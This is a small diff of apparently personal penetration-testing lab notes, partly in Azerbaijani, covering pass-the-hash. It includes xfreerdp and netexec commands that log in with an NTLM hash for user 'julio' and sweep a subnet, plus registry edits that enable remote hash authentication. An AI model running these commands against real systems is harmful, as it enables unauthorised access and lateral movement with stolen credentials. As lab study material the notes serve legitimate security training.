@@ -161,7 +161,7 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalA
 Restart lazım deyil!
 
 Bu əvvəl işləmirdi, indi işləyər
-xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /f
+xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B 
 netexec smb 172.16.1.0/24 -u julio -H 64F12CDDAA88057E06A81B54E73B949B
 
 Fix et
@@ -172,5 +172,6 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t R
 
 Test et
 netexec smb 10.129.201.126 -u julio -H 64F12CDDAA88057E06A81B54E73B949B
+
 
 
